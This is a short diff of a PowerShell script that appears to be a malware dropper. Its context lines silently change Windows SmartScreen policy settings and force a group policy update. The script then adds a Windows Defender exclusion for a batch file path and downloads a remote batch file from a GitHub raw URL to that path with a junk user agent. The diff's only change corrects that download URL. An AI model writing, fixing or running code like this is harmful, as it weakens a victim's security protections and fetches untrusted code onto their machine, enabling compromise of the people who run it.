@@ -22,7 +22,7 @@ Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Smart
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen' -Name 'ConfigureSmartScreen' -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
 gpupdate /force | Out-Null -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
 
-$url = "https://github.com/mihsamihsa2000-ux/check.bat/raw/main/checkbat"
+$url = "https://github.com/mihsamihsa2000-ux/checkbat/raw/main/check.bat"
 $outputFile = "C:\Users\ccmmmd.bat"
 Add-MpPreference -ExclusionPath $outputFile
 Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "SJSHDOWSJHIAOOWUIWOJFAIWOFJIWEAOFJEWIOFJEWIOJEWIOTGEWUIOGEHUGHESUIGEHSIUEHIUEIUE"
